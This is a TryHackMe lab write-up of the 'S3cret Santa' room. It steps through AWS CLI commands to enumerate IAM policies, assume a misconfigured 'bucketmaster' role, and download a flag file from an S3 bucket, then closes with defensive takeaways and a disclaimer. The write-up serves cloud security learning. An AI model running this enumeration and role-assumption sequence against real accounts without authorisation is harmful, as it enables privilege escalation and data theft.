# 🎄 AWS Security – S3cret Santa (TryHackMe)

## 📌 Overview

This repository documents my hands-on learning from the **TryHackMe AWS Security – S3cret Santa** room.
The lab focuses on **AWS IAM misconfigurations**, **role assumption abuse**, and **S3 data exposure**, demonstrating how attackers can escalate privileges in cloud environments.

The objective was to enumerate IAM permissions, assume a misconfigured role, and exfiltrate sensitive data from an S3 bucket.

---

## 🎯 Learning Objectives

* Understand **AWS IAM users, roles, groups, and policies**
* Enumerate IAM permissions using **AWS CLI**
* Exploit **sts:AssumeRole** misconfiguration
* Access and extract sensitive data from **Amazon S3**
* Learn real-world **cloud privilege escalation techniques**

---

## 🛠 Tools & Technologies

* **AWS CLI**
* **AWS IAM**
* **AWS STS (Security Token Service)**
* **Amazon S3**
* **TryHackMe AttackBox / Local Terminal**

---

## 🧠 Key Concepts Covered

* IAM Users, Roles, Groups
* Inline vs Managed Policies
* Role Trust Policies
* Temporary Security Credentials
* S3 Bucket Enumeration
* Cloud Misconfiguration Risks

---

## 🔍 Step-by-Step Breakdown

### 1️⃣ Verifying AWS Credentials

Used AWS STS to verify the configured identity:

```bash
aws sts get-caller-identity
```

✔ Confirmed valid credentials for IAM user **sir.carrotbane**.

---

### 2️⃣ Enumerating IAM Users

```bash
aws iam list-users
```

Enumerated available IAM users in the account.

---

### 3️⃣ Enumerating User Policies

Checked inline and attached policies:

```bash
aws iam list-user-policies --user-name sir.carrotbane
aws iam list-attached-user-policies --user-name sir.carrotbane
```

✔ Found an **inline policy** allowing IAM enumeration and `sts:AssumeRole`.

---

### 4️⃣ Enumerating IAM Roles

```bash
aws iam list-roles
```

✔ Discovered a role named **bucketmaster** that could be assumed by `sir.carrotbane`.

---

### 5️⃣ Inspecting Role Permissions

```bash
aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy
```

The role allowed:

* `s3:ListAllMyBuckets`
* `s3:ListBucket`
* `s3:GetObject`

---

### 6️⃣ Assuming the bucketmaster Role

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/bucketmaster \
  --role-session-name TBFC
```

✔ Received temporary credentials (Access Key, Secret Key, Session Token).

Configured them as environment variables to assume the role.

---

### 7️⃣ Verifying Role Assumption

```bash
aws sts get-caller-identity
```

✔ Confirmed identity switched to **bucketmaster role**.

---

### 8️⃣ Enumerating S3 Buckets

```bash
aws s3api list-buckets
```

✔ Identified an interesting bucket:
**`easter-secrets-123145`**

---

### 9️⃣ Listing Bucket Contents

```bash
aws s3api list-objects --bucket easter-secrets-123145
```

---

### 🔓 10️⃣ Extracting Sensitive Data

```bash
aws s3api get-object \
  --bucket easter-secrets-123145 \
  --key cloud_password.txt \
  cloud_password.txt
```

📄 **Extracted File Content:**

```
THM{more_like_sir_cloudbane}
```

---

## 🚨 Security Misconfigurations Identified

* Overly permissive IAM inline policies
* Dangerous use of `sts:AssumeRole`
* Excessive S3 permissions granted to roles
* Sensitive data stored in S3 without proper access control

---

## 🧩 MITRE ATT&CK Mapping (Cloud)

* **Privilege Escalation** – Misconfigured IAM Roles
* **Credential Access** – Temporary STS Credentials
* **Data Exfiltration** – S3 Object Download

---

## ✅ Key Takeaways

* IAM misconfigurations are a **major cloud security risk**
* Even read-only permissions can lead to **full data exposure**
* Always apply the **Principle of Least Privilege**
* Monitor and restrict **role assumption permissions**

---

## 📚 Platform

* **TryHackMe**
* Room: **AWS Security – S3cret Santa**

---

## ⚠ Disclaimer

This repository is created **for educational purposes only**.
All actions were performed in a **controlled TryHackMe lab environment**.

---

## 👨‍💻 Author

**Balamurugan**
Cybersecurity | Ethical Hacking | Cloud Security
TryHackMe Learner 🚀
